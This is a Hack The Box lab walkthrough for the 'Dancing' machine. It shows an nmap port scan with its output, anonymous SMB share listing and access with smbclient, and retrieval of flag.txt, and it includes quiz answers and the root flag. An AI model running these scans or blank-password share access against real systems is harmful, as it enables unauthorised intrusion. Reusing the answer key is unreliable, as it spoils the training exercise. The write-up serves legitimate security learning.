---
layout: post
category:
    - Hack The Box
    - Tier 0
---

Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2. It also provides an authenticated inter-process communication (IPC) mechanism. In 1987, Microsoft and 3Com implemented SMB in LAN Manager for OS/2, at which time SMB used the NetBIOS service atop the NetBIOS Frames protocol as its underlying transport.


---

💻️ The Target Machine is : 10.129.192.19

---

A tip I would suggest, if you don't want to constantly retype the IP address you can opt to export the address to a variable whose name can be of your chosing. 
In turn you can call the variable as `$[variableName]` the **$** is important.
Conside the command below:
```
-$ export IP=10.129.192.19 
```
The command is entered directly into the terminal that would be currently running and will be only active in that terminal.
To test the command:
```
-$ echo $IP
10.129.192.19
```

### Answering HTB Questions 

> What does the 3-letter acronym SMB stand for?
>> server message block

> What port does SMB use to operate at? 
>> 445

> What is the service name for port 445 that came up in our Nmap scan? 
>> microsoft-ds

> What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? 
>> -L

> How many shares are there on Dancing? 
>> 4

> What is the name of the share we are able to access in the end with a blank password?
>> workshares

> What is the command we can use within the SMB shell to download the files we find? 
>> get

  

## -------------------------| ENUMARATION PHASE |------------------------------

```
-$ sudo nmap -p- --min-rate 5000 -sV -sC $IP -v -oN scan.nmap 

---snip---

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h00m44s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-18T10:24:27
|_  start_date: N/A

---snip---

```
**`-p-`** ==> scan all the 65535 ports.
**`-sV`** ==> Enumerate the version of the service that is open.
**`-sC`** ==> Use default scrips to enumerate certain things like the version, OS
**`-v`** ==> Show me everything that the tool is doing. Being verbose.
**`-oN`** ==> On a normal file output everything there hence the filename [initial_scan]()

## ----------------------------| EXPLOITAION |---------------------------------

With what we have discovered we can try and gain foothold on the machine.

The first thing we can start with is and assume that the password as blank:

```
-$ smbclient -L $IP

 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
```
We see that there are 4 shares.
The next step is too access a share in our case we are going to access the workshares since it doesn't require any password we can pass in a blank password.

```
-$ smbclient //$IP/WorkShares

Password for [WORKGROUP\olapapi]:
Try "help" to get a list of possible commands.
smb: \> help

---snip---

blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             

---snip---

smb: \> ls
  .                                   D        0  Mon Mar 29 11:22:01 2021
  ..                                  D        0  Mon Mar 29 11:22:01 2021
  Amy.J                               D        0  Mon Mar 29 12:08:24 2021
  James.P                             D        0  Thu Jun  3 11:38:03 2021

smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 11:38:03 2021
  ..                                  D        0  Thu Jun  3 11:38:03 2021
  flag.txt                            A       32  Mon Mar 29 12:26:57 2021

smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

> Submit root flag
>> 5f61c10dffbc77a704d76016a22f1664

